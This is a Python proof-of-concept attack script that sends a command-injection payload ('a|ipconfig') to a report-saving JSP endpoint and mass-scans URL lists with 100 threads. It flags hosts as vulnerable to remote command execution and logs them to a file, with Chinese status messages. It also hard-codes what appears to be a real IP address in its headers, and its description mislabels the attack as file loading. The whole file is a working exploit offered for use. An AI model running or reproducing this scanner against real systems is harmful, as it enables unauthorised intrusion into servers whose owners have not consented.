import requests, argparse, re, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """


                                                 /$$                                                     /$$                                 /$$          
                                                |__/                                                    | $$                                |__/          
  /$$$$$$$  /$$$$$$   /$$$$$$  /$$$$$$$          /$$  /$$$$$$         /$$$$$$   /$$$$$$   /$$$$$$$      | $$$$$$$  /$$   /$$        /$$$$$$  /$$  /$$$$$$ 
 /$$_____/ /$$__  $$ /$$__  $$| $$__  $$ /$$$$$$| $$ /$$__  $$       /$$__  $$ /$$__  $$ /$$_____/      | $$__  $$| $$  | $$       /$$__  $$| $$ /$$__  $$
|  $$$$$$ | $$  \ $$| $$  \ $$| $$  \ $$|______/| $$| $$  \ $$      | $$  \ $$| $$  \ $$| $$            | $$  \ $$| $$  | $$      | $$  \ $$| $$| $$$$$$$$
 \____  $$| $$  | $$| $$  | $$| $$  | $$        | $$| $$  | $$      | $$  | $$| $$  | $$| $$            | $$  | $$| $$  | $$      | $$  | $$| $$| $$_____/
 /$$$$$$$/| $$$$$$$/|  $$$$$$/| $$  | $$        | $$| $$$$$$$/      | $$$$$$$/|  $$$$$$/|  $$$$$$$      | $$$$$$$/|  $$$$$$$      | $$$$$$$/| $$|  $$$$$$$
|_______/ | $$____/  \______/ |__/  |__/        |__/| $$____/       | $$____/  \______/  \_______/      |_______/  \____  $$      | $$____/ |__/ \_______/
          | $$                                      | $$            | $$                                           /$$  | $$      | $$                    
          | $$                                      | $$            | $$                                          |  $$$$$$/      | $$                    
          |__/                                      |__/            |__/                                           \______/       |__/                    
                   

                                                                                                        @author: black apple pie
                                                                                                        @version: 0.0.1
"""
    print(banner)


#poc
def poc(target):
    path = "/report/DesignReportSave.jsp?report=../test.jsp"
    headers = {
        "Content-Length": "40",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://112.91.138.81:85",
        "Referer": "http://112.91.138.81:85/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }

    data = 'jsondata[ip]=a|ipconfig&jsondata[type]=1'
    try:
        res = requests.post(url=target+path, timeout=5, verify=False, data=data)
        if 'DNS' in res.text:
            print("[+]" + target + "存在远程命令执行漏洞")
            with open('command.txt', 'a', encoding='utf-8') as f:
                f.write(target + "存在远程命令执行漏洞\n")
            return True
        else:
            print("[-]" + target + "不存在远程命令执行漏洞")
    except Exception as e:
        print(f"Failed to connect to {target}")

def main():
    banner()

    parser = argparse.ArgumentParser(description='this is a canal file_load attacl poc')

    #添加参数
    parser.add_argument('-u', '--url', dest='url', help='input attack url', type=str)
    parser.add_argument('-f', '--file', dest='file', help='url.txt', type=str)

    #调用
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open('url.txt', 'r', encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

#调用
if __name__ == '__main__':
    main()